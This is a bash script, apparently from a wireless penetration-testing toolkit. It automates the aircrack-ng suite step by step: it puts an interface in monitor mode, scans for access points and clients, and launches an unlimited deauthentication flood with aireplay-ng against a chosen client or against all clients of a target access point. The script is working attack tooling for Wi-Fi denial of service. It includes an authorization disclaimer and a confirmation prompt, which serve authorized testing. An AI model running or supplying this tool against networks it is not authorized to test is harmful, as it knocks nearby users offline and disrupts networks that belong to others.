#!/bin/bash
#
# doubletap.sh - Interactive aircrack-ng suite wrapper
# Automates: interface -> monitor mode -> band scan -> target select -> focused scan -> target select -> deauth
#
# Part of the AmpedGH wireless recon toolkit.
# Requires: aircrack-ng suite (airmon-ng, airodump-ng, aireplay-ng), root privileges
# Use only on networks you own or are explicitly authorized to test.
#

set -uo pipefail

SCAN_DIR="$(mktemp -d /tmp/doubletap.XXXXXX)"
IFACE=""
MONIFACE=""
CSV_PREFIX="$SCAN_DIR/scan"
FOCUS_PREFIX="$SCAN_DIR/focus"
KILLED_PROCESSES=0

cleanup() {
    echo
    echo "[*] Cleaning up..."
    if [[ -n "$MONIFACE" ]]; then
        echo "[*] Stopping monitor mode on $MONIFACE..."
        airmon-ng stop "$MONIFACE" >/dev/null 2>&1
    fi
    if [[ "$KILLED_PROCESSES" -eq 1 ]]; then
        echo "[*] Restoring NetworkManager..."
        systemctl restart NetworkManager >/dev/null 2>&1
    fi
    rm -rf "$SCAN_DIR"
    echo "[*] Done."
}
trap cleanup EXIT INT TERM

require_root() {
    if [[ $EUID -ne 0 ]]; then
        echo "[!] This script must be run as root (sudo)." >&2
        exit 1
    fi
}

check_deps() {
    for cmd in airmon-ng airodump-ng aireplay-ng; do
        if ! command -v "$cmd" >/dev/null 2>&1; then
            echo "[!] Missing dependency: $cmd. Install aircrack-ng suite." >&2
            exit 1
        fi
    done
}

# Converts a 1-based index into a selection label: 1=a, 2=b, ... 26=z, then rolls over to
# plain numbers (27, 28, ...) once the alphabet is exhausted. Keeps single-hand phone typing
# on the default letter keyboard for the common case, without an unbounded label scheme.
idx_to_label() {
    local n=$1
    if (( n <= 26 )); then
        printf "\\$(printf '%03o' $((96 + n)))"
    else
        echo "$n"
    fi
}

select_interface() {
    echo "[*] Available wireless interfaces:"
    mapfile -t IFACES < <(iw dev 2>/dev/null | awk '$1=="Interface"{print $2}')
    if [[ ${#IFACES[@]} -eq 0 ]]; then
        echo "[!] No wireless interfaces found." >&2
        exit 1
    fi

    declare -A IFACE_MAP
    for i in "${!IFACES[@]}"; do
        local label
        label=$(idx_to_label "$((i+1))")
        printf "  [%s] %s\n" "$label" "${IFACES[$i]}"
        IFACE_MAP[$label]="${IFACES[$i]}"
    done

    read -rp "Select interface: " sel
    sel="${sel,,}"
    if [[ -z "${IFACE_MAP[$sel]:-}" ]]; then
        echo "[!] Invalid selection." >&2
        exit 1
    fi
    IFACE="${IFACE_MAP[$sel]}"
    echo "[*] Selected interface: $IFACE"

    read -rp "Kill interfering processes (NetworkManager, wpa_supplicant, etc.)? [y/N]: " kill_choice
    if [[ "$kill_choice" =~ ^[Yy]$ ]]; then
        echo "[*] Killing interfering processes..."
        airmon-ng check kill >/dev/null 2>&1
        KILLED_PROCESSES=1
    else
        echo "[*] Skipping process kill. Note: NetworkManager/wpa_supplicant may interfere with monitor mode or cause airodump to keep resetting the channel."
    fi

    echo "[*] Enabling monitor mode on $IFACE..."
    airmon-ng start "$IFACE" >/tmp/airmon_start.log 2>&1

    # Determine resulting monitor interface name (varies by driver: wlan0mon, wlan0, etc.)
    MONIFACE=$(iw dev 2>/dev/null | awk '$1=="Interface"{print $2}' | grep -E "mon$|^${IFACE}$" | head -n1)
    if [[ -z "$MONIFACE" ]]; then
        MONIFACE="${IFACE}mon"
    fi
    echo "[*] Monitor interface: $MONIFACE"
}

select_band() {
    echo
    echo "[*] Select band to scan:"
    echo "  [a] 2.4GHz"
    echo "  [b] 5GHz"
    read -rp "Choice: " band_choice
    band_choice="${band_choice,,}"
    if [[ "$band_choice" == "a" ]]; then
        BAND_FLAG="--channel 1,2,3,4,5,6,7,8,9,10,11"
        BAND_LABEL="2.4GHz"
    elif [[ "$band_choice" == "b" ]]; then
        BAND_FLAG="--band a"
        BAND_LABEL="5GHz"
    else
        echo "[!] Invalid choice." >&2
        exit 1
    fi
    echo "[*] Band selected: $BAND_LABEL"
}

# Runs airodump-ng in background, writes CSV, and waits for the user to press Enter (blank input) to stop
# $1 = prefix, $2 = "quiet" or "live", remaining args = extra airodump-ng args
run_scan() {
    local prefix="$1"
    local mode="$2"
    shift 2
    local extra_args=("$@")

    echo
    echo "[*] Starting airodump-ng scan. Press Enter at any time to stop."
    if [[ "$mode" == "live" ]]; then
        echo "[*] Tip: give this at least 15-30 seconds so client devices have a chance to be heard."
    fi
    rm -f "${prefix}"-*.csv 2>/dev/null

    if [[ "$mode" == "live" ]]; then
        airodump-ng "${extra_args[@]}" -w "$prefix" --output-format csv "$MONIFACE" &
    else
        airodump-ng "${extra_args[@]}" -w "$prefix" --output-format csv "$MONIFACE" \
            >/tmp/airodump_scan.log 2>&1 &
    fi
    local dump_pid=$!

    # Blocks until the user presses Enter (blank input = stop)
    read -rp "[Press Enter to stop] "
    kill "$dump_pid" >/dev/null 2>&1
    wait "$dump_pid" 2>/dev/null

    # Give airodump a moment to flush the CSV file
    sleep 1
}

# Parses the airodump CSV for APs and prints a lettered list; sets AP_BSSID / AP_CHANNEL / AP_ESSID
select_target_ap() {
    local prefix="$1"
    local csv_file
    csv_file=$(ls -t "${prefix}"-*.csv 2>/dev/null | head -n1)

    if [[ -z "$csv_file" || ! -f "$csv_file" ]]; then
        echo "[!] No scan results found." >&2
        exit 1
    fi

    # AP section of the CSV is between the header row and the blank line before "Station MAC"
    # Normalize CRLF first: a stray \r makes blank lines fail to match /^$/, causing the
    # AP-only range to run past the intended stop and swallow station rows too.
    mapfile -t ap_lines < <(tr -d '\r' < "$csv_file" | sed -n '/^BSSID/,/^$/p' | sed '1d;$d' | sed '/^$/d')

    if [[ ${#ap_lines[@]} -eq 0 ]]; then
        echo "[!] No access points found in scan." >&2
        exit 1
    fi

    echo
    echo "[*] Discovered access points:"
    printf "  %-4s %-19s %-4s %-5s %s\n" "#" "BSSID" "CH" "PWR" "ESSID"

    declare -gA AP_MAP_BSSID
    declare -gA AP_MAP_CHANNEL
    declare -gA AP_MAP_ESSID

    local idx=1
    for line in "${ap_lines[@]}"; do
        local bssid channel power essid label
        bssid=$(echo "$line" | awk -F', ' '{print $1}' | xargs)
        channel=$(echo "$line" | awk -F', ' '{print $4}' | xargs)
        power=$(echo "$line" | awk -F', ' '{print $9}' | xargs)
        essid=$(echo "$line" | awk -F', ' '{print $14}' | xargs)

        [[ -z "$bssid" ]] && continue

        label=$(idx_to_label "$idx")
        printf "  %-4s %-19s %-4s %-5s %s\n" "$label" "$bssid" "$channel" "$power" "$essid"
        AP_MAP_BSSID[$label]="$bssid"
        AP_MAP_CHANNEL[$label]="$channel"
        AP_MAP_ESSID[$label]="$essid"
        ((idx++))
    done

    read -rp "Select target AP: " ap_sel
    ap_sel="${ap_sel,,}"
    if [[ -z "${AP_MAP_BSSID[$ap_sel]:-}" ]]; then
        echo "[!] Invalid selection." >&2
        exit 1
    fi

    AP_BSSID="${AP_MAP_BSSID[$ap_sel]}"
    AP_CHANNEL="${AP_MAP_CHANNEL[$ap_sel]}"
    AP_ESSID="${AP_MAP_ESSID[$ap_sel]}"
    echo "[*] Target selected: $AP_ESSID ($AP_BSSID) on channel $AP_CHANNEL"
}

# Parses focused-scan CSV for stations connected to AP_BSSID; sets CLIENT_MAC
select_target_client() {
    local prefix="$1"
    local csv_file
    csv_file=$(ls -t "${prefix}"-*.csv 2>/dev/null | head -n1)

    if [[ -z "$csv_file" || ! -f "$csv_file" ]]; then
        echo "[!] No scan results found." >&2
        exit 1
    fi

    mapfile -t station_lines < <(tr -d '\r' < "$csv_file" | sed -n '/^Station MAC/,$p' | sed '1d' | sed '/^$/d')

    echo
    echo "[*] Connected clients (or type 'all' to target the broadcast address / all clients):"
    printf "  %-4s %-19s\n" "#" "Station MAC"

    declare -gA CLIENT_MAP
    local idx=1
    local matched=0
    for line in "${station_lines[@]}"; do
        local sta_mac assoc_bssid label
        sta_mac=$(echo "$line" | awk -F', ' '{print $1}' | xargs)
        assoc_bssid=$(echo "$line" | awk -F', ' '{print $6}' | xargs)

        [[ -z "$sta_mac" ]] && continue
        [[ "$assoc_bssid" != "$AP_BSSID" ]] && continue

        label=$(idx_to_label "$idx")
        printf "  %-4s %-19s\n" "$label" "$sta_mac"
        CLIENT_MAP[$label]="$sta_mac"
        matched=1
        ((idx++))
    done

    # Fallback: strict BSSID-field matching found nothing, but the focused scan was already
    # narrowed to this AP's channel/BSSID via airodump-ng flags, so list all stations seen.
    if [[ "$matched" -eq 0 ]]; then
        echo "  (no stations matched by BSSID field — showing all stations seen during focused scan)"
        for line in "${station_lines[@]}"; do
            local sta_mac label
            sta_mac=$(echo "$line" | awk -F', ' '{print $1}' | xargs)
            [[ -z "$sta_mac" ]] && continue
            label=$(idx_to_label "$idx")
            printf "  %-4s %-19s\n" "$label" "$sta_mac"
            CLIENT_MAP[$label]="$sta_mac"
            ((idx++))
        done
    fi

    read -rp "Select client (or 'all' for broadcast): " cl_sel
    cl_sel="${cl_sel,,}"
    if [[ "$cl_sel" == "all" ]]; then
        CLIENT_MAC="FF:FF:FF:FF:FF:FF"
    elif [[ -n "${CLIENT_MAP[$cl_sel]:-}" ]]; then
        CLIENT_MAC="${CLIENT_MAP[$cl_sel]}"
    else
        echo "[!] Invalid selection." >&2
        exit 1
    fi
    echo "[*] Client selected: $CLIENT_MAC"
}

do_deauth() {
    echo
    echo "[*] Preparing deauth: AP=$AP_BSSID CH=$AP_CHANNEL Client=$CLIENT_MAC"
    read -rp "Confirm you are authorized to test this network. Type 'yes' to proceed: " confirm
    if [[ "$confirm" != "yes" ]]; then
        echo "[*] Aborted."
        return
    fi

    iw dev "$MONIFACE" set channel "$AP_CHANNEL" >/dev/null 2>&1

    if [[ "$CLIENT_MAC" == "FF:FF:FF:FF:FF:FF" ]]; then
        aireplay-ng -0 0 -a "$AP_BSSID" "$MONIFACE"
    else
        aireplay-ng -0 0 -a "$AP_BSSID" -c "$CLIENT_MAC" "$MONIFACE"
    fi
}

main() {
    require_root
    check_deps
    select_interface
    select_band

    # Phase 1: broad band scan (quiet — output suppressed)
    run_scan "$CSV_PREFIX" quiet $BAND_FLAG
    select_target_ap "$CSV_PREFIX"

    # Phase 2: focused scan on target channel (live — output visible)
    echo
    echo "[*] Locking to channel $AP_CHANNEL for focused scan on $AP_ESSID..."
    run_scan "$FOCUS_PREFIX" live --bssid "$AP_BSSID" --channel "$AP_CHANNEL"
    select_target_client "$FOCUS_PREFIX"

    # Phase 3: deauth
    do_deauth
}

main
